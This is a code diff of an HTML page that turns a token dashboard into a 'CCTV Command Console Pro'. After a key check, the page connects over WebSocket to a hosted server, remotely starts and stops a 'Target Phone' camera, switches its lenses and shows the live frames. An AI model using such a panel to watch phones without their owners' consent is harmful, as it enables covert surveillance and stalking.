@@ -3,120 +3,336 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Control System Dashboard</title>
+    <title>CCTV Command Console Pro</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #0A0A0E; color: #E4E4E7; padding: 30px;
+            background-color: #08080C;
+            color: #F4F4F5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 16px;
         }
-        .container { max-width: 800px; margin: 0 auto; }
-        .header { margin-bottom: 30px; border-bottom: 1px solid #1F1F2E; padding-bottom: 15px; }
-        h1 { color: #3B82F6; font-size: 24px; }
-        .panel-box { background: #12121A; border: 1px solid #1F1F2E; border-radius: 16px; padding: 20px; margin-bottom: 25px; }
-        .form-group { display: flex; gap: 15px; margin-top: 15px; }
-        select, button { padding: 12px 20px; border-radius: 10px; font-size: 14px; font-weight: 600; }
-        select { background: #161622; color: #FFF; border: 1px solid #2D2D3F; }
-        button { background: #3B82F6; color: white; border: none; cursor: pointer; transition: 0.2s; }
-        button:hover { background: #2563EB; }
+
+        /* Fluid Premium Card Layout */
+        .console-card {
+            width: 100%;
+            max-width: 440px;
+            background: #111118;
+            border: 1px solid #1F1F2F;
+            border-radius: 28px;
+            padding: 26px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #3B82F6;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #71717A;
+            margin-bottom: 24px;
+        }
+
+        /* Dynamic View Block Panels */
+        #login-panel { display: block; }
+        #control-panel { display: none; }
+
+        /* Beautiful Form Styling */
+        .form-group {
+            text-align: left;
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            color: #A1A1AA;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #1F1F2F;
+            border-radius: 14px;
+            background: #161622;
+            color: #FFFFFF;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+        input:focus {
+            border-color: #3B82F6;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+        }
+
+        /* Control Panel Switch Buttons Grid */
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
         
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; text-align: left; }
-        th, td { padding: 14px; border-bottom: 1px solid #1F1F2E; font-size: 14px; }
-        th { color: #A1A1AA; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
-        td { font-weight: 500; }
-        .badge { padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; }
-        .badge-pending { background: rgba(234, 179, 8, 0.15); color: #EAB308; }
-        .badge-active { background: rgba(16, 185, 129, 0.15); color: #10B981; }
-        .badge-expired { background: rgba(239, 68, 68, 0.15); color: #EF4444; }
+        .btn-primary { background: #3B82F6; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2); }
+        .btn-primary:hover { background: #2563EB; }
+        
+        .btn-success { background: #10B981; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2); }
+        .btn-success:hover { background: #059669; }
+
+        .btn-danger { background: #EF4444; box-shadow: 0 4px 12px rgba(239, 68, 68, 0.2); }
+        .btn-danger:hover { background: #DC2626; }
+
+        .btn-secondary { 
+            background: #181826; 
+            border: 1px solid #2A2A3F; 
+            color: #E4E4E7;
+        }
+        .btn-secondary:hover { background: #222235; border-color: #3B82F6; }
+        .btn-secondary.active { background: #3B82F6; border-color: #3B82F6; color: #FFF; }
+
+        /* Hardware Stream Terminal Viewport */
+        .video-viewport {
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #000000;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 1px solid #1F1F2F;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+
+        .loader-text {
+            color: #52525B;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+
+        /* Security Infrastructure Status Badge */
+        .status-badge {
+            background: #161622;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #A1A1AA;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            border: 1px solid #1F1F2F;
+        }
+
+        .indicator-dot {
+            width: 8px;
+            height: 8px;
+            background: #52525B;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .indicator-dot.live {
+            background: #10B981;
+            animation: pulseBlink 1.2s infinite;
+        }
+
+        @keyframes pulseBlink {
+            0% { opacity: 0.3; }
+            50% { opacity: 1; }
+            100% { opacity: 0.3; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <h1>Token Provisioning Subsystem</h1>
-            <p style="color: #71717A; font-size: 14px;">Create and monitor authorization lifecycle channels</p>
-        </div>
-
-        <div class="panel-box">
-            <h3 style="font-size: 16px;">Generate New Registration Token</h3>
+    <div class="console-card">
+        <div id="login-panel">
+            <h2>System Authentication</h2>
+            <div class="subtitle">Enter validation key token to establish link</div>
+            
             <div class="form-group">
-                <select id="durationSelect">
-                    <option value="1">Expire in 1 Hour</option>
-                    <option value="12">Expire in 12 Hours</option>
-                    <option value="24" selected>Expire in 24 Hours</option>
-                    <option value="168">Expire in 7 Days</option>
-                </select>
-                <button onclick="createNewKeyToken()">Generate System Key</button>
+                <label for="keyInput">Security Access Key</label>
+                <input type="text" id="keyInput" placeholder="CTX-XXXXXXXX" autocomplete="off" />
             </div>
-            <div id="resultBox" style="margin-top: 15px; font-size: 15px; font-weight: bold; color: #10B981;"></div>
+            
+            <button class="btn-primary" onclick="validateAndConnect()">Verify Token Channel</button>
         </div>
 
-        <div class="panel-box">
-            <h3 style="font-size: 16px; margin-bottom: 10px;">Active System Token Database Matrix</h3>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Access Token Key</th>
-                        <th>Expiration Time</th>
-                        <th>Hardware Node Target</th>
-                        <th>Lifecycle Status</th>
-                    </tr>
-                </thead>
-                <tbody id="tokenTableBody">
-                    </tbody>
-            </table>
+        <div id="control-panel">
+            <h2 id="displayTitle">Terminal Hub</h2>
+            <div class="subtitle" id="deviceStateText">Checking transmission link status...</div>
+
+            <div class="btn-group">
+                <button class="btn-success" onclick="executeCommand('START_CAM')">⚡ Start Stream</button>
+                <button class="btn-danger" onclick="executeCommand('STOP_CAM')">🛑 Stop Stream</button>
+            </div>
+            
+            <div class="btn-group">
+                <button id="btnBackLens" class="btn-secondary active" onclick="toggleLens('BACK')">Rear Lens</button>
+                <button id="btnFrontLens" class="btn-secondary" onclick="toggleLens('FRONT')">Front Lens</button>
+            </div>
+
+            <div class="video-viewport">
+                <div id="loader-msg" class="loader-text">Stream Tunnel Pipeline Idle</div>
+                <img id="streamBufferView" alt="Live Viewport Feed" />
+            </div>
+
+            <div class="status-badge">
+                <span id="statusDot" class="indicator-dot"></span>
+                <span id="statusLabel">Syncing Authentication Route...</span>
+            </div>
         </div>
     </div>
 
 <script>
-    function createNewKeyToken() {
-        const hours = document.getElementById('durationSelect').value;
-        fetch('/api/generate-key', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ durationHours: hours })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if(data.success) {
-                document.getElementById('resultBox').innerText = `Successfully Generated: ${data.key}`;
-                updateDatabaseMatrixTable();
-            }
-        });
+    let wsUrl = "wss://superx-oje2.onrender.com";
+    let ws;
+    let secureToken = "";
+    let selectedLens = "BACK";
+
+    function validateAndConnect() {
+        secureToken = document.getElementById('keyInput').value.trim().toUpperCase();
+        if(!secureToken) {
+            alert("Security token validation parameter empty!");
+            return;
+        }
+
+        // Shift Layout View states smoothly
+        document.getElementById('login-panel').style.display = "none";
+        document.getElementById('control-panel').style.display = "block";
+        document.getElementById('displayTitle').innerText = "Matrix Terminal Session";
+
+        launchSecureStreamSocket();
     }
 
-    function updateDatabaseMatrixTable() {
-        fetch('/api/keys-status')
-        .then(res => res.json())
-        .then(data => {
-            const tbody = document.getElementById('tokenTableBody');
-            tbody.innerHTML = '';
-            
-            if(data.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#52525B;">No tokens allocated yet.</td></tr>`;
-                return;
+    function launchSecureStreamSocket() {
+        if(ws) ws.close();
+        
+        ws = new WebSocket(wsUrl);
+        ws.binaryType = 'blob'; // Enforce optimal fast data chunk handling
+
+        ws.onopen = () => {
+            document.getElementById('statusLabel').innerText = "Secure handshake connected.";
+            ws.send(JSON.stringify({ 
+                type: 'register_viewer', 
+                authKey: secureToken 
+            }));
+        };
+
+        ws.onmessage = (event) => {
+            if (event.data instanceof Blob) {
+                // High performance fast binary rendering pipeline
+                const blobUrl = URL.createObjectURL(event.data);
+                const oldUrl = document.getElementById('streamBufferView').src;
+                
+                document.getElementById('streamBufferView').src = blobUrl;
+                document.getElementById('streamBufferView').style.display = 'block';
+                document.getElementById('loader-msg').style.display = 'none';
+                
+                // Clear old instances instantly from local memory matrix to maintain zero lag
+                if(oldUrl.startsWith('blob:')) {
+                    URL.revokeObjectURL(oldUrl);
+                }
+            } else {
+                const signalPacket = JSON.parse(event.data);
+                
+                // If core authorization verification checks drop out
+                if(signalPacket.status === "error") {
+                    alert(signalPacket.message);
+                    location.reload();
+                    return;
+                }
+
+                if(signalPacket.status === "connected") {
+                    document.getElementById('deviceStateText').innerText = `Target Phone Core State: ${signalPacket.deviceState}`;
+                    document.getElementById('statusLabel').innerText = "Secure Pipeline Tunnel Active.";
+                    document.getElementById('statusDot').className = "indicator-dot live";
+                }
+                if(signalPacket.status === "app_online") {
+                    document.getElementById('deviceStateText').innerText = "Target Phone Core State: ONLINE";
+                }
+                if(signalPacket.status === "offline") {
+                    document.getElementById('deviceStateText').innerText = "Target Phone Core State: OFFLINE";
+                    document.getElementById('streamBufferView').style.display = 'none';
+                    document.getElementById('loader-msg').style.display = 'block';
+                }
             }
+        };
 
-            data.forEach(item => {
-                let badgeClass = "badge-pending";
-                if(item.status === "ACTIVE_LOGIN") badgeClass = "badge-active";
-                if(item.status === "EXPIRED") badgeClass = "badge-expired";
-
-                const row = `<tr>
-                    <td style="color:#3B82F6; font-family:monospace; font-size:15px;">${item.key}</td>
-                    <td>${new Date(item.expiresAt).toLocaleString()}</td>
-                    <td style="color:#FFF;">${item.connectedDevice}</td>
-                    <td><span class="badge ${badgeClass}">${item.status}</span></td>
-                </tr>`;
-                tbody.innerHTML += row;
-            });
-        });
+        ws.onclose = () => {
+            document.getElementById('statusDot').className = "indicator-dot";
+            document.getElementById('statusLabel').innerText = "Handshake closed. Reconnecting engine layer...";
+            setTimeout(launchSecureStreamSocket, 3000); // Persistent automatic heartbeat reconstruction
+        };
     }
 
-    // Auto-update table mapping loop every 5 seconds
-    updateDatabaseMatrixTable();
-    setInterval(updateDatabaseMatrixTable, 5000);
+    function executeCommand(actionCode) {
+        if(ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+                type: 'control_cmd',
+                action: actionCode,
+                cameraFacing: selectedLens
+            }));
+        }
+    }
+
+    function toggleLens(lensCode) {
+        selectedLens = lensCode;
+        
+        // Dynamic active status shift styling
+        if(lensCode === 'BACK') {
+            document.getElementById('btnBackLens').className = "btn-secondary active";
+            document.getElementById('btnFrontLens').className = "btn-secondary";
+        } else {
+            document.getElementById('btnBackLens').className = "btn-secondary";
+            document.getElementById('btnFrontLens').className = "btn-secondary active";
+        }
+
+        executeCommand('START_CAM'); // Lens switch trigger packet push command
+    }
 </script>
 </body>
 </html>
